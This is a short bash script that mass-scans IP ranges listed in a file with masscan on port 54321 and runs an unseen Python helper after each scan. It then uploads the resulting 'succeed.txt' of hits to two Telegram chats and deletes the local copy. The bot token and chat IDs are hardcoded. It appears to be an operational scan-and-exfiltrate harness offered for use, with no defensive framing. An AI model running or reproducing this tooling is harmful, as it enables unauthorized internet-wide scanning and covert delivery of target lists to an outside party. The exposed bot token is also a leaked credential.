send_message() {
    TOKEN='6904748810:AAGK5Mf3RtnmXLFKv6yLKoL03BVx5LJNhnY'
    
    chat_id_1='5457029194'
    chat_id_2='6021321590'
    
    URL="https://api.telegram.org/bot${TOKEN}/sendMessage"
    
    curl -s -X POST $URL -d chat_id="${chat_id_1}" -d text="$1" > /dev/null
    
    curl -s -X POST $URL -d chat_id="${chat_id_2}" -d text="$1" > /dev/null
}

send_file() {
    TOKEN='6904748810:AAGK5Mf3RtnmXLFKv6yLKoL03BVx5LJNhnY'
    
    chat_id_1='5457029194'
    chat_id_2='6021321590'
        URL="https://api.telegram.org/bot${TOKEN}/sendDocument"
    file_path='succeed.txt'
    
    if [ -f "$file_path" ]; then
        beijing_time=$(TZ="Asia/Shanghai" date '+%Y.%m.%d_%H:%M')
                new_file_name="${beijing_time}.txt"
        mv "${file_path}" "${new_file_name}"
                curl -s -F chat_id="${chat_id_1}" -F document=@"${new_file_name}" "${URL}" > /dev/null
                curl -s -F chat_id="${chat_id_2}" -F document=@"${new_file_name}" "${URL}" > /dev/null
                rm "${new_file_name}"
    else
        send_message "none"
    fi
}
scan_and_send() {
    echo "Reading IP addresses from ipcird.txt..."
    while IFS= read -r sbip || [[ -n "$sbip" ]]; do
        echo "Scanning IP: $sbip"
        masscan -p54321 "$sbip" --max-rate 2000 -oG results.txt
        python3 s.py
    done < ipcird.txt

    echo "Done"
        send_file
}
scan_and_send
